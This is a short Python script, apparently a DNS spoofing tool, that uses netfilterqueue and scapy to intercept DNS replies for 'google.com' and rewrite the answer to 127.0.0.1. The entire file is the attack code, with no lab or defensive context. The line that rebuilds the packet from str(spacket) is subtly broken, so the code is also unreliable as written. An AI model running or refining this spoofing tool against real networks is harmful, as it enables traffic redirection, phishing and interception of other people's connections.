import netfilterqueue as nfq
import scapy.all as scapy

def processpacket(packet):
    spacket = scapy.IP(packet.get_payload())
    if spacket.haslayer(scapy.DNSRR):
        queryname = spacket[scapy.DNSQR].qname
        targetdomain = "google.com"
        spoofedip = "127.0.0.1"
        if bytes(targetdomain.encode()) in queryname:
            print("[+] Spoofing Target")
            dnsreply = scapy.DNSRR(rrname=queryname, rdata=spoofedip)
            spacket[scapy.DNS].an = dnsreply
            spacket[scapy.DNS].ancount = 1

            del spacket[scapy.IP].len
            del spacket[scapy.IP].chksum
            del spacket[scapy.UDP].len
            del spacket[scapy.UDP].chksum
            
            packet.set_payload(bytes(str(spacket).encode()))

    packet.accept()
try:
    queue = nfq.NetfilterQueue()
    queue.bind(0, processpacket)
    queue.run()
except KeyboardInterrupt:
    print("Quitting...")
    exit(0)
